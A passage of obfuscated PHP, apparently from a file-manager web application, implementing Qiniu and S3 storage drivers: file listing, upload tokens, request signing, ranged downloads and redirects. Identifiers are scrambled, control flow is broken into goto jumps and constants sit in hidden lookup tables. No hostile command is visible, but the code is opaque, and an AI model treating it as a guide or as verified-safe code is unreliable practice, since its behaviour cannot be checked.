Cèæ‚ò…Ωä; eÂ˜≤›Ï¯ã: $AÆ¶ø‚çÙ‚ = 0; $b˜Éﬁºï⁄ = 0; while (!0) { list($aÆñÙ‘Ö‘ï, $AÎ”ôÜÔ¢Í) = $this->bucketManager->listFiles($this->bucket, $aìÃ§àÁâÀ, $cüÙäèÊåö, $Aîœç»‹∏¿, $E√†Ùãç˘©); if ($AÎ”ôÜÔ¢Í) { return !1; } $cüÙäèÊåö = array_key_exists($Då´“ñ‘ãÏ[1179], $aÆñÙ‘Ö‘ï) ? $cüÙäèÊåö = $aÆñÙ‘Ö‘ï[$Då´“ñ‘ãÏ[1210]] : $Då´“ñ‘ãÏ[33]; if ($Dƒı⁄ä·∆ã) { if (!empty($aÆñÙ‘Ö‘ï[$Då´“ñ‘ãÏ[1211]])) { $AÆ¶ø‚çÙ‚ += count($aÆñÙ‘Ö‘ï[$Då´“ñ‘ãÏ[1211]]); } if (!empty($aÆñÙ‘Ö‘ï[$Då´“ñ‘ãÏ[1214]])) { $b˜Éﬁºï⁄ += count($aÆñÙ‘Ö‘ï[$Då´“ñ‘ãÏ[1214]]); } if ($cüÙäèÊåö === $Då´“ñ‘ãÏ[33]) { break; } continue; } if ($Eº¯ƒïŸﬁá) { if (!empty($aÆñÙ‘Ö‘ï[$Då´“ñ‘ãÏ[1211]])) { return !0; } } else { if (!empty($aÆñÙ‘Ö‘ï[$Då´“ñ‘ãÏ[1214]])) { return !0; } } if ($cüÙäèÊåö == $Då´“ñ‘ãÏ[33]) { break; } } goto fµÛÙ‚∞í; Cèæ‚ò…Ωä: $cüÙäèÊåö = $Då´“ñ‘ãÏ[33]; $Aîœç»‹∏¿ = 1000; $E√†Ùãç˘© = $Då´“ñ‘ãÏ[8]; goto eÂ˜≤›Ï¯ã; fµÛÙ‚∞í: if ($Dƒı⁄ä·∆ã) { return array($Då´“ñ‘ãÏ[187] => $AÆ¶ø‚çÙ‚, $Då´“ñ‘ãÏ[188] => $b˜Éﬁºï⁄); } return !1; goto E£ öÈØàé; E£ öÈØàé: } public function listAll($dÜä∑ü–∆∆) { $a¢˜À›óä =& $_SERVER[¯èãÄπµ]; $fòœéá—¬¢ = $this->fileList($dÜä∑ü–∆∆, 1); $dú¡ª£¢ÔÛ = array(); foreach ($fòœéá—¬¢ as $aúÛ–àŒ⁄ò) { $dú¡ª£¢ÔÛ[$aúÛ–àŒ⁄ò[$a¢˜À›óä[28]]] = $aúÛ–àŒ⁄ò[$a¢˜À›óä[77]]; } return $this->listAllFiles($dÜä∑ü–∆∆, array_keys($dú¡ª£¢ÔÛ), $dú¡ª£¢ÔÛ); } public function canRead($BßÂà‡ˆÇÖ) { return $this->exist($BßÂà‡ˆÇÖ) ? !0 : !1; } public function canWrite($dÓç·»ÏßÚ) { return $this->exist($dÓç·»ÏßÚ) ? !0 : !1; } public function getContent($dÍ”ﬂÇ£ç˘) { return $this->fileSubstr($dÍ”ﬂÇ£ç˘, 0, -1); } public function setContent($fÑÍüÈæ≥≤, $D ùº°§Öâ = '') { $eçé∂è›–¡ = $this->tempFile($this->pathThis($fÑÍüÈæ≥≤)); file_put_contents($eçé∂è›–¡, $D ùº°§Öâ); if ($this->upload($fÑÍüÈæ≥≤, $eçé∂è›–¡)) { $this->tempFileRemve($eçé∂è›–¡); return !0; } return !1; } public function refreshUrls($eâîÌòÜÀ‰) { goto fÔ‡Ïœåíı; F∑Ñ˘òò√Û: $b≤˘∑ƒ¶Íˆ = new Qiniu\Cdn\CdnManager($this->auth); list($b´ÜßÆÜ„ü, $B‘ëûÜ¡ÉÓ) = $b≤˘∑ƒ¶Íˆ->refreshUrls($b›æÎáç√◊); if ($B‘ëûÜ¡ÉÓ) { return !1; } goto D∂‘Ω‹¨¥◊; D∂‘Ω‹¨¥◊: return $b´ÜßÆÜ„ü[$B¥∏™á†∑ï[1215]] == $B¥∏™á†∑ï[699] ? !0 : !1; goto FØ»ﬁü©¶ç; fÔ‡Ïœåíı: $B¥∏™á†∑ï =& $_SERVER[¯èãÄπµ]; $b›æÎáç√◊ = array(); if (is_array($eâîÌòÜÀ‰)) { foreach ($eâîÌòÜÀ‰ as $b∆•ΩÌãéé) { $b›æÎáç√◊[] = $this->link($b∆•ΩÌãéé); } } else { $b›æÎáç√◊[] = $this->link($eâîÌòÜÀ‰); } goto F∑Ñ˘òò√Û; FØ»ﬁü©¶ç: } public function fileSubstr($bê¯Œ†éìã, $Dàîü≠≈¢ﬁ, $aÌ◊∆¢ËÛ∫) { $A™˜üâééç =& $_SERVER[¯èãÄπµ]; if (!($A•ÑôÀæà¶ = $this->link($bê¯Œ†éìã))) { return !1; } $aèÖˆ¥ñêÊ = !1; if ($aÌ◊∆¢ËÛ∫ > 0) { $FÍ¬ÎÔ¥èË = $Dàîü≠≈¢ﬁ + $aÌ◊∆¢ËÛ∫ - 1; $aèÖˆ¥ñêÊ = array($A™˜üâééç[1216] . $Dàîü≠≈¢ﬁ . $A™˜üâééç[408] . $FÍ¬ÎÔ¥èË); } $fâ˜ÈÚ√¡ì = url_request($A•ÑôÀæà¶, $A™˜üâééç[212], !1, $aèÖˆ¥ñêÊ); return $fâ˜ÈÚ√¡ì[$A™˜üâééç[692]] ? $fâ˜ÈÚ√¡ì[$A™˜üâééç[1036]] : !1; } public function upload($b†®±òÖñ∏, $D€¡Ñ„‹«, $a≈áªﬂﬂñç = false, $CûÕ™€‹äπ = REPEAT_REPLACE) { $b—›Ω±ïÏ“ = new Qiniu\Storage\UploadManager(); $D—£ˆÍ∆úÑ = $this->auth->uploadToken($this->bucket, $b†®±òÖñ∏); $Eôáéë€ãæ = get_file_mime(get_path_ext($D€¡Ñ„‹«)); list($Eæî‰Õ±û∆, $bÜÕŸâäÙ») = $b—›Ω±ïÏ“->putFile($D—£ˆÍ∆úÑ, $b†®±òÖñ∏, $D€¡Ñ„‹«, null, $Eôáéë€ãæ); return $bÜÕŸâäÙ» ? !1 : $this->getPathOuter($b†®±òÖñ∏); } public function uploadFormData($Dë≥Ê“†±’, $d‰◊∂¢Øü = 3600) { return $this->uploadToken($Dë≥Ê“†±’, $d‰◊∂¢Øü); } public function multiUploadFormData($d„çãÛÇóä, $bÕìı´÷´ì = 3600) { return $this->uploadToken($d„çãÛÇóä, $bÕìı´÷´ì); } private function uploadToken($Aóä“í‰§°, $F»Ü≤ü√…… = 3600) { goto cäåƒ§ã≈…; FΩ’€îèÉá: $CíÏ÷›á•≠ = null; $EøƒéàîÒÈ = $this->auth->uploadToken($this->bucket, $CíÏ÷›á•≠, $dÖ–¯∂è∫◊, $f‡£øâØöê, !0); $CÕÂ¢Ÿñü› = empty($this->region) || $this->region == $A‹≠™çòíÖ[1219] ? $A‹≠™çòíÖ[33] : $A‹≠™çòíÖ[408] . $this->region; goto F…Öö®©íº; F…Öö®©íº: $b¿ùÒÔù∑ê = http_type() . "\x3a\57\57\165\160\154\x6f\141\144{$CÕÂ¢Ÿñü›}\56\161\151\x6e\x69\x75\160\56\143\157\155\57"; return array($A‹≠™çòíÖ[1220] => $EøƒéàîÒÈ, $A‹≠™çòíÖ[1221] => $b¿ùÒÔù∑ê); goto cÌ∑∏î≥ñ«; cäåƒ§ã≈…: $A‹≠™çòíÖ =& $_SERVER[¯èãÄπµ]; $dÖ–¯∂è∫◊ = $F»Ü≤ü√……; $f‡£øâØöê = array($A‹≠™çòíÖ[1217] => $A‹≠™çòíÖ[1218]); goto FΩ’€îèÉá; cÌ∑∏î≥ñ«: } public function download($aŒàÉ»ã—∞, $d·‘‘«éé…) { goto B‰§≈ˆÉÇ; cÔ«ûâ’õ˜: fclose($BÌ¡Ÿ™Çµø); return $d·‘‘«éé…; goto Fß±©ÜÜ†∫; a°«‹ë∏◊™: $Bﬁ’‰Øπ’∞ = 1024 * 200; $BÌ¡Ÿ™Çµø = fopen($aµ∏¨ÓÍÍØ, $_SERVER[¯èãÄπµ][1222]); while (!0) { $F…ﬁä°–äí = $this->fileSubstr($aŒàÉ»ã—∞, $e¡ª‘ÂÑùê, $Bﬁ’‰Øπ’∞); if ($F…ﬁä°–äí === !1) { return !1; } fwrite($BÌ¡Ÿ™Çµø, $F…ﬁä°–äí); $e¡ª‘ÂÑùê += $Bﬁ’‰Øπ’∞; if (strlen($F…ﬁä°–äí) < $Bﬁ’‰Øπ’∞) { break; } } goto cÔ«ûâ’õ˜; B‰§≈ˆÉÇ: $aµ∏¨ÓÍÍØ = IO::getPathInner(IO::mkfile($d·‘‘«éé…)); if (!($fÇìâÔŒÁò = $this->link($aŒàÉ»ã—∞))) { return !1; } $e¡ª‘ÂÑùê = 0; goto a°«‹ë∏◊™; Fß±©ÜÜ†∫: } public function link($fﬁÛóÌê≥ã, $Aæé¶ëÊ¶™ = '') { if (!$this->isFile($fﬁÛóÌê≥ã)) { return !1; } $FãóÜÚÖ‡ç = $this->getHost() . $_SERVER[¯èãÄπµ][8] . $this->pathEncode($fﬁÛóÌê≥ã) . $Aæé¶ëÊ¶™; return $this->auth->privateDownloadUrl($FãóÜÚÖ‡ç, 3600 * 12); } public function fileOut($FëÜ™»ÿÌì, $aºÏπÑ≠ä = false, $dÙÌËå˜∆Ω = false, $a∞„äÉÍ†• = '') { $CøÖÏÉÊ©‡ =& $_SERVER[¯èãÄπµ]; if (!$dÙÌËå˜∆Ω) { $dÙÌËå˜∆Ω = $this->pathThis($FëÜ™»ÿÌì); } $D£êœÉÆ˜• = $aºÏπÑ≠ä ? $CøÖÏÉÊ©‡[1223] . rawurlencode($dÙÌËå˜∆Ω) : $CøÖÏÉÊ©‡[33]; $dêû›ÓËÒﬁ = $this->link($FëÜ™»ÿÌì, $D£êœÉÆ˜•); $this->fileOutLink($dêû›ÓËÒﬁ); } public function fileOutServer($aîÀá«è≈Ü, $CÏè∂ÂÖ§ì = false, $aè∫ﬁÊ∫ÂÉ = false, $c„⁄€ïäŒÏ = '') { parent::fileOut($aîÀá«è≈Ü, $CÏè∂ÂÖ§ì, $aè∫ﬁÊ∫ÂÉ, $c„⁄€ïäŒÏ); } public function fileOutImage($DÙ≈¿ö–ÿ⁄, $c˜√§á∑çœ = 250) { $A©°Îâ≠ÿ∫ = $this->link($DÙ≈¿ö–ÿ⁄, $_SERVER[¯èãÄπµ][1224] . $c˜√§á∑çœ); $this->fileOutLink($A©°Îâ≠ÿ∫); } public function fileOutImageServer($aÓ∆û„¯¯Ã, $aäâ˘∫ä¨¨ = 250) { parent::fileOutImage($aÓ∆û„¯¯Ã, $aäâ˘∫ä¨¨); } public function hashMd5($BÚ‚ÎŸ£®ô) { $eˆïüÜè ≥ =& $_SERVER[¯èãÄπµ]; $Cø©˘Ü®∫“ = $this->objectMeta($BÚ‚ÎŸ£®ô); return isset($Cø©˘Ü®∫“[$eˆïüÜè ≥[192]]) ? $Cø©˘Ü®∫“[$eˆïüÜè ≥[192]] : !1; $eäàô°µ◊› = $this->link($BÚ‚ÎŸ£®ô, $eˆïüÜè ≥[1225]); } public function size($E°¯ı“Ì©ÿ) { $Dö«ﬁïãíÛ = $this->objectMeta($E°¯ı“Ì©ÿ); return $Dö«ﬁïãíÛ ? $Dö«ﬁïãíÛ[$_SERVER[¯èãÄπµ][77]] : 0; } public function info($B¥¨Æ√çÜ≥) { if ($this->isFolder($B¥¨Æ√çÜ≥)) { return $this->folderInfo($B¥¨Æ√çÜ≥); } else { if ($this->isFile($B¥¨Æ√çÜ≥)) { return $this->fileInfo($B¥¨Æ√çÜ≥); } } return !1; } public function exist($f∏∫Â˘™ıù) { return $this->isFile($f∏∫Â˘™ıù) || $this->isFolder($f∏∫Â˘™ıù); } public function isFile($b•›•èÕ‚‰) { return !$this->isFolder($b•›•èÕ‚‰) && $this->objectMeta($b•›•èÕ‚‰); } public function isFolder($fñ√ò çµ∑) { return $this->cacheMethod($_SERVER[¯èãÄπµ][219], $fñ√ò çµ∑); } protected function objectMeta($F„—ïü≠æü) { return $this->cacheMethod($_SERVER[¯èãÄπµ][220], $F„—ïü≠æü); } protected function _objectMeta($E‡ôæ°á∫∑) { $fÔ≥Üá÷ìè =& $_SERVER[¯èãÄπµ]; list($cÙéò°á∂Û, $bä§£Úëçé) = $this->bucketManager->stat($this->bucket, $E‡ôæ°á∫∑); if ($cÙéò°á∂Û) { $cÙéò°á∂Û[$fÔ≥Üá÷ìè[77]] = intval($cÙéò°á∂Û[$fÔ≥Üá÷ìè[1212]]); } return $cÙéò°á∂Û; } protected function _isFolder($C£êï¿œ∑Â) { $eÀÛÖæÛù∆ =& $_SERVER[¯èãÄπµ]; list($EÔΩΩ÷≤è∂, $FË·°óΩ÷Ì) = $this->bucketManager->listFiles($this->bucket, trim($C£êï¿œ∑Â, $eÀÛÖæÛù∆[8]) . $eÀÛÖæÛù∆[8], $eÀÛÖæÛù∆[33], 1, $eÀÛÖæÛù∆[8]); return !empty($EÔΩΩ÷≤è∂[$eÀÛÖæÛù∆[1211]]) || !empty($EÔΩΩ÷≤è∂[$eÀÛÖæÛù∆[1214]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($bàÿÕ®ÂËí) { parent::__construct($bàÿÕ®ÂËí); } public function uploadFormData($a÷â‹¨ã∫Ç, $Bﬁ·€Ö ç‚ = 3600) { goto cΩ˜èªô∏œ; a¡ª∑‡ãÃë: $fî¿Éâ÷Óí = base64_encode(json_encode($b⁄èıìçÓ≤)); $aã∆›øïØÃ = hash_hmac($Dû’“ƒ≠Ã¬[1138], $b•§ÂÀïŒû, $Dû’“ƒ≠Ã¬[1139] . $this->secret, !0); $A‹ë·⁄Ëﬁˆ = hash_hmac($Dû’“ƒ≠Ã¬[1138], $this->region, $aã∆›øïØÃ, !0); goto E¢¡Ì“ËÂƒ; cΩ˜èªô∏œ: $Dû’“ƒ≠Ã¬ =& $_SERVER[¯èãÄπµ]; $e ˆ–¥Í∞ = $Dû’“ƒ≠Ã¬[181]; $eﬂ◊‘ÛÖ€∏ = $Dû’“ƒ≠Ã¬[1128]; goto bÖÿà∫úÈÇ; aÙÎÌà∫Üﬁ: $f§÷®Öû®À = $Dû’“ƒ≠Ã¬[1130]; $bã‡£®ÇÍ≥ = $Bﬁ·€Ö ç‚ . $Dû’“ƒ≠Ã¬[33]; $f£ıÓ⁄€âË = $Dû’“ƒ≠Ã¬[1095]; goto fØ£‡ıç√‹; fØ£‡ıç√‹: $BÁÁ®Î…œú = array($this->accessKey, $b•§ÂÀïŒû, $this->region, $dáÇ–Õœﬂã, $f§÷®Öû®À); $dﬂß ŒäÉ = implode($Dû’“ƒ≠Ã¬[8], $BÁÁ®Î…œú); $b⁄èıìçÓ≤ = array($Dû’“ƒ≠Ã¬[1097] => gmdate($Dû’“ƒ≠Ã¬[1096], strtotime($Dû’“ƒ≠Ã¬[1131])), $Dû’“ƒ≠Ã¬[1098] => array(array($Dû’“ƒ≠Ã¬[1100] => $this->bucket), array($Dû’“ƒ≠Ã¬[1099] => $e ˆ–¥Í∞), array($Dû’“ƒ≠Ã¬[1101], $Dû’“ƒ≠Ã¬[1102], $Dû’“ƒ≠Ã¬[33]), array($Dû’“ƒ≠Ã¬[1101], $Dû’“ƒ≠Ã¬[1132], $Dû’“ƒ≠Ã¬[33]), array($Dû’“ƒ≠Ã¬[1101], $Dû’“ƒ≠Ã¬[1133], $Dû’“ƒ≠Ã¬[33]), array($Dû’“ƒ≠Ã¬[1103] => $f£ıÓ⁄€âË), array($Dû’“ƒ≠Ã¬[1134] => $dﬂß ŒäÉ), array($Dû’“ƒ≠Ã¬[1135] => $eﬂ◊‘ÛÖ€∏), array($Dû’“ƒ≠Ã¬[1136] => $d£¬öÜ®ÿ÷), array($Dû’“ƒ≠Ã¬[1137] => $bã‡£®ÇÍ≥))); goto a¡ª∑‡ãÃë; E¢¡Ì“ËÂƒ: $AãÏàåúÑ∏ = hash_hmac($Dû’“ƒ≠Ã¬[1138], $dáÇ–Õœﬂã, $A‹ë·⁄Ëﬁˆ, !0); $AÒ ™ˆäâ€ = hash_hmac($Dû’“ƒ≠Ã¬[1138], $f§÷®Öû®À, $AãÏàåúÑ∏, !0); $AûìÛ¢≥◊“ = hash_hmac($Dû’“ƒ≠Ã¬[1138], $fî¿Éâ÷Óí, $AÒ ™ˆäâ€); goto a‡œâ´äìè; a‡œâ´äìè: $cÂôäïèÿÑ = array($Dû’“ƒ≠Ã¬[195] => $Dû’“ƒ≠Ã¬[33], $Dû’“ƒ≠Ã¬[1140] => $Dû’“ƒ≠Ã¬[33], $Dû’“ƒ≠Ã¬[1099] => $e ˆ–¥Í∞, $Dû’“ƒ≠Ã¬[1103] => $f£ıÓ⁄€âË, $Dû’“ƒ≠Ã¬[1107] => $fî¿Éâ÷Óí, $Dû’“ƒ≠Ã¬[1141] => $dﬂß ŒäÉ, $Dû’“ƒ≠Ã¬[1142] => $eﬂ◊‘ÛÖ€∏, $Dû’“ƒ≠Ã¬[1143] => $d£¬öÜ®ÿ÷, $Dû’“ƒ≠Ã¬[1144] => $bã‡£®ÇÍ≥, $Dû’“ƒ≠Ã¬[1145] => $AûìÛ¢≥◊“, $Dû’“ƒ≠Ã¬[165] => $this->getHost()); return $cÂôäïèÿÑ; goto eﬁ∂∫ƒû‡À; bÖÿà∫úÈÇ: $dáÇ–Õœﬂã = $Dû’“ƒ≠Ã¬[59]; $d£¬öÜ®ÿ÷ = gmdate($Dû’“ƒ≠Ã¬[1129]); $b•§ÂÀïŒû = gmdate($Dû’“ƒ≠Ã¬[693]); goto aÙÎÌà∫Üﬁ; eﬁ∂∫ƒû‡À: } public function multiUploadFormData($D¢ﬁàêùì√, $C€æıãî”ƒ = 3600) { $E‹ù›çÒı˜ =& $_SERVER[¯èãÄπµ]; $DñÆÉ¢©§Î = gmdate($E‹ù›çÒı˜[1226]); $e¿…—ó˘ãﬂ = array(); $CÀøè≥ï ” = $this->client->getUploadId($this->bucket, $D¢ﬁàêùì√, $e¿…—ó˘ãﬂ); if (!$CÀøè≥ï ”) { return !1; } return array($E‹ù›çÒı˜[205] => $CÀøè≥ï ”, $E‹ù›çÒı˜[165] => $this->getHost() . $E‹ù›çÒı˜[8] . $this->pathEncode($D¢ﬁàêùì√), $E‹ù›çÒı˜[206] => $DñÆÉ¢©§Î, $E‹ù›çÒı˜[89] => $D¢ﬁàêùì√); } public function multiUploadAuthData($bü∑ÿ≤û≥», $bÜ‰É‹ü†ó = array()) { goto A⁄˜éá´ç≥; eÿº‡âƒÔ˜: $aÜÔá≠âÊØ = $F§ÍÃ∏Ø‚[210]; $f∞æ¯Ïµ≈Ü = $F§ÍÃ∏Ø‚[8] . $this->pathEncode($cÏŸÀ—Ø¿“) . $B©Øú’¶µÜ; $BëƒÈë¥Àõ = $this->client->__getSignatureV4($d”ìáıÊÀ∂, $aÕ⁄ﬁ–Õ©÷, $aÜÔá≠âÊØ, $f∞æ¯Ïµ≈Ü); goto Cì…«ñëπò; Cì…«ñëπò: if (strpos($B©Øú’¶µÜ, $F§ÍÃ∏Ø‚[209]) === 0) { if (isset($d”ìáıÊÀ∂[$F§ÍÃ∏Ø‚[1228]])) { $dê∆É√“ÑÛ = $d”ìáıÊÀ∂[$F§ÍÃ∏Ø‚[1228]]; } else { if (isset($BëƒÈë¥Àõ[$F§ÍÃ∏Ø‚[1228]])) { $dê∆É√“ÑÛ = $BëƒÈë¥Àõ[$F§ÍÃ∏Ø‚[1228]]; } else { $dê∆É√“ÑÛ = hash($F§ÍÃ∏Ø‚[1138], $F§ÍÃ∏Ø‚[33]); } } return array($F§ÍÃ∏Ø‚[216] => $BëƒÈë¥Àõ[$F§ÍÃ∏Ø‚[216]], $F§ÍÃ∏Ø‚[1228] => $dê∆É√“ÑÛ, $F§ÍÃ∏Ø‚[206] => $BëƒÈë¥Àõ[$F§ÍÃ∏Ø‚[1231]]); } return $BëƒÈë¥Àõ[$F§ÍÃ∏Ø‚[216]]; goto fÇ‚å÷çÂ∫; fê›Øç€˘¶: unset($bÜ‰É‹ü†ó[$F§ÍÃ∏Ø‚[89]]); if (isset($bÜ‰É‹ü†ó[$F§ÍÃ∏Ø‚[207]])) { return $this->listUploadParts($cÏŸÀ—Ø¿“, $bÜ‰É‹ü†ó); } $d”ìáıÊÀ∂ = array(); goto A‚ä“ˆıåƒ; A‚ä“ˆıåƒ: if (isset($bÜ‰É‹ü†ó[$F§ÍÃ∏Ø‚[1227]])) { $d”ìáıÊÀ∂[$F§ÍÃ∏Ø‚[1228]] = $bÜ‰É‹ü†ó[$F§ÍÃ∏Ø‚[1227]]; } $B•éøã÷‡ª = explode($F§ÍÃ∏Ø‚[167], $this->getHost()); $aÕ⁄ﬁ–Õ©÷ = array($F§ÍÃ∏Ø‚[1229] => $B•éøã÷‡ª[1], $F§ÍÃ∏Ø‚[1230] => $F§ÍÃ∏Ø‚[33], $F§ÍÃ∏Ø‚[195] => $F§ÍÃ∏Ø‚[115], $F§ÍÃ∏Ø‚[1140] => $bÜ‰É‹ü†ó[$F§ÍÃ∏Ø‚[77]]); goto eÿº‡âƒÔ˜; A⁄˜éá´ç≥: $F§ÍÃ∏Ø‚ =& $_SERVER[¯èãÄπµ]; $B©Øú’¶µÜ = isset($bÜ‰É‹ü†ó[$F§ÍÃ∏Ø‚[156]]) ? $bÜ‰É‹ü†ó[$F§ÍÃ∏Ø‚[156]] : $F§ÍÃ∏Ø‚[33]; $cÏŸÀ—Ø¿“ = $bÜ‰É‹ü†ó[$F§ÍÃ∏Ø‚[89]]; goto fê›Øç€˘¶; fÇ‚å÷çÂ∫: } public function listUploadParts($añ‹≤©¬óœ, $BÈﬁ±öÈë = array()) { goto füìôÊÛ„«; cˆï£ı˜›ˆ: $c›Í…Ú€Ÿ” = $this->client->__getSignatureV4($Aº∞º˜∏ì©, $eäÔÂ©›¿ò, $D£è›‹÷ÿŸ, $F–∞‹ë¯Ïò, $Bë‹Æ®ë¡); return array($a˜≠ÜëËœÏ[216] => $c›Í…Ú€Ÿ”[$a˜≠ÜëËœÏ[216]], $a˜≠ÜëËœÏ[206] => $c›Í…Ú€Ÿ”[$a˜≠ÜëËœÏ[1231]], $a˜≠ÜëËœÏ[218] => $c◊ÂŸ–—çÇ, $a˜≠ÜëËœÏ[1228] => $c›Í…Ú€Ÿ”[$a˜≠ÜëËœÏ[1228]]); goto cƒò∑›≈‡î; fñ£†ÑìÑ®: if (!$c◊ÂŸ–—çÇ) { return !1; } $Bë‹Æ®ë¡ = $a˜≠ÜëËœÏ[1232]; foreach ($c◊ÂŸ–—çÇ as $Eç„∞Ÿ—¿«) { $Bë‹Æ®ë¡ .= $a˜≠ÜëËœÏ[1233] . "\x3c\x50\141\x72\164\116\x75\x6d\142\145\x72\76{$Eç„∞Ÿ—¿«[$a˜≠ÜëËœÏ[1184]]}\74\57\x50\141\x72\x74\116\x75\155\x62\x65\x72\76\12" . "\74\x45\x54\141\x67\76{$Eç„∞Ÿ—¿«[$a˜≠ÜëËœÏ[1185]]}\74\57\105\x54\x61\x67\x3e\12" . $a˜≠ÜëËœÏ[1234]; } goto Fùßﬂú⁄÷Ü; füìôÊÛ„«: $a˜≠ÜëËœÏ =& $_SERVER[¯èãÄπµ]; $e¥ê—éµŒâ = str_replace($a˜≠ÜëËœÏ[217], $a˜≠ÜëËœÏ[33], $BÈﬁ±öÈë[$a˜≠ÜëËœÏ[156]]); $c◊ÂŸ–—çÇ = $this->client->listParts($this->bucket, $añ‹≤©¬óœ, $e¥ê—éµŒâ); goto fñ£†ÑìÑ®; Fùßﬂú⁄÷Ü: $Bë‹Æ®ë¡ .= $a˜≠ÜëËœÏ[1235]; $Aº∞º˜∏ì© = array(); $bº¢ıÔ—÷¯ = explode($a˜≠ÜëËœÏ[167], $this->getHost()); goto fﬁ¶ˆˆ€“ä; fﬁ¶ˆˆ€“ä: $eäÔÂ©›¿ò = array($a˜≠ÜëËœÏ[1229] => $bº¢ıÔ—÷¯[1], $a˜≠ÜëËœÏ[195] => $a˜≠ÜëËœÏ[115], $a˜≠ÜëËœÏ[1140] => strlen($Bë‹Æ®ë¡)); $D£è›‹÷ÿŸ = $a˜≠ÜëËœÏ[208]; $F–∞‹ë¯Ïò = $a˜≠ÜëËœÏ[8] . $this->pathEncode($añ‹≤©¬óœ) . $BÈﬁ±öÈë[$a˜≠ÜëËœÏ[156]]; goto cˆï£ı˜›ˆ; cƒò∑›≈‡î: } public function link($a§»≤‡ÃáÒ, $bâå´¡í∫Ó = array()) { return parent::link($a§»≤‡ÃáÒ, $bâå´¡í∫Ó); } public function fileOut($eêãà£†®–, $F§ﬂÀ–ÿÿπ = false, $dåÉÆèàƒË = false, $E≤Í—≥…ˆç = '') { if (strstr($this->endpoint, $_SERVER[¯èãÄπµ][1236])) { return parent::fileOutServer($eêãà£†®–, $F§ﬂÀ–ÿÿπ, $dåÉÆèàƒË, $E≤Í—≥…ˆç); } parent::fileOut($eêãà£†®–, $F§ﬂÀ–ÿÿπ, $dåÉÆèàƒË, $E≤Í—≥…ˆç); } public function fileOutImage($Fó˘¥∞êç, $B®œ◊÷ÏÃÂ = 250) { if (strstr($this->endpoint, $_SERVER[¯èãÄπµ][1236])) { return parent::fileOutImageServer($Fó˘¥∞êç, $B®œ◊÷ÏÃÂ); } parent::fileOutImage($Fó˘¥∞êç, $B®œ◊÷ÏÃÂ); } public function fileOutLink($c∆èåì˜ô˘) { $a‘ÓîüíÇë =& $_SERVER[¯èãÄπµ]; if (substr($c∆èåì˜ô˘, 0, 7) == $a‘ÓîüíÇë[1110]) { $c∆èåì˜ô˘ = $a‘ÓîüíÇë[1111] . substr($c∆èåì˜ô˘, 7); } header($a‘ÓîüíÇë[152] . $c∆èåì˜ô˘); die; } public function getHost() { $cèÊúßµ≈É =& $_SERVER[¯èãÄπµ]; $Dî¿áåÃá¢ = str_rtrim(parent::getHost(), $cèÊúßµ≈É[8] . $this->bucket); $Dî¿áåÃá¢ = explode($cèÊúßµ≈É[167], $Dî¿áåÃá¢); return $Dî¿áåÃá¢[0] . $cèÊúßµ≈É[167] . $this->bucket . $cèÊúßµ≈É[91] . $Dî¿áåÃá¢[1]; } } goto E–ã„êÎ†‹; f’§îƒéÃ®: $BÉæ◊”ÆÇä = $_SERVER[¯èãÄπµ][547]; class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($cıÉ∏å«ÚŸ) { goto bíÈ´ŒΩŸÎ; bâ≤œ∆ú≤®: $this->defaultAction = $Fñ“›óûﬂÌ[2] ? $Fñ“›óûﬂÌ[2] : $this->defaultAction; $this->{$_SERVER[œ][3]}($bìïáçµÊó[4], array($this, $bìïáçµÊó[5])); $aˆ„„˜‰Ó÷ = $d‹ë≈•”≠º[552]; goto DüÆÎ‘ˆò±; bíÈ´ŒΩŸÎ: $d‹ë≈•”≠º =& $_SERVER[¯èãÄπµ]; $bìïáçµÊó =& $_SERVER[œ]; $Fñ“›óûﬂÌ = $bìïáçµÊó[0]($bìïáçµÊó[1], $bìïáçµÊó[2]($cıÉ∏å«ÚŸ, $bìïáçµÊó[1])); goto f—»í‡¨¡©; f—»í‡¨¡©: $A¯éìá˘‚π = $d‹ë≈•”≠º[548]; if (strlen($A¯éìá˘‚π) < $d‹ë≈•”≠º[549]) { return; } $this->defaultModule = $Fñ“›óûﬂÌ[0] ? $Fñ“›óûﬂÌ[0] : $this->defaultModule; goto Cé¥Ò»ºÿ; Cé¥Ò»ºÿ: $dä°Ú√¥ﬁΩ = $d‹ë≈•”≠º[550]; while (strlen($dä°Ú√¥ﬁΩ) < $d‹ë≈•”≠º[551]) { if (!$dä°Ú√¥ﬁΩ) { break; } $dä°Ú√¥ﬁΩ++; } $this->defaultController = $Fñ“›óûﬂÌ[1] ? $Fñ“›óûﬂÌ[1] : $this->defaultController; goto bâ≤œ∆ú≤®; DüÆÎ‘ˆò±: while ($aˆ„„˜‰Ó÷ < $d‹ë≈•”≠º[544]) { if ($aˆ„„˜‰Ó÷ >= 0) { break; } $aˆ„„˜‰Ó÷++; } goto e±±¢ç„≠ü; e±±¢ç„≠ü: } public function appRun($fßß≥¬äßÉ) { goto A–¥“ÉÇ”; Fâ§∆ø’°˜: $d»úá”¨±¯ = $CÖ¨è†¿Û[554]; $d¬±ˆ¨⁄Ÿ¨ = $Fõªà“àº†[7]; if ($F¯ı≈ÆÑ™† == $Fõªà“àº†[8]) { $d¬±ˆ¨⁄Ÿ¨ = $Fõªà“àº†[9]; $Eÿàø»ÆÆ‡[0] = $Fõªà“àº†[10]; $Eÿàø»ÆÆ‡[1] = $Eÿàø»ÆÆ‡[1] . $Fõªà“àº†[11]; $fßß≥¬äßÉ = $Fõªà“àº†[12]($Fõªà“àº†[1], $Eÿàø»ÆÆ‡); $fßß≥¬äßÉ = $Fõªà“àº†[2]($fßß≥¬äßÉ, $Fõªà“àº†[1]); } goto aèÁä•ìéï; aèÁä•ìéï: $Fõªà“àº†[13](array($Fõªà“àº†[14], $Fõªà“àº†[15]), $d¬±ˆ¨⁄Ÿ¨ . $Fõªà“àº†[16], $fßß≥¬äßÉ); $Fõªà“àº†[17]($fßß≥¬äßÉ); $få≤÷Õ–ƒº = $CÖ¨è†¿Û[555]; goto Aèú™§äœË; FÈÈ¢åÍü™: $AÊßêéÉ¿ß = $CÖ¨è†¿Û[553]; if (!$AÊßêéÉ¿ß) { die; } $F¯ı≈ÆÑ™† = $Fõªà“àº†[6]($Eÿàø»ÆÆ‡[0]); goto Fâ§∆ø’°˜; Aèú™§äœË: $Fõªà“àº†[13](array($Fõªà“àº†[14], $Fõªà“àº†[15]), $d¬±ˆ¨⁄Ÿ¨ . $Fõªà“àº†[18], $fßß≥¬äßÉ); 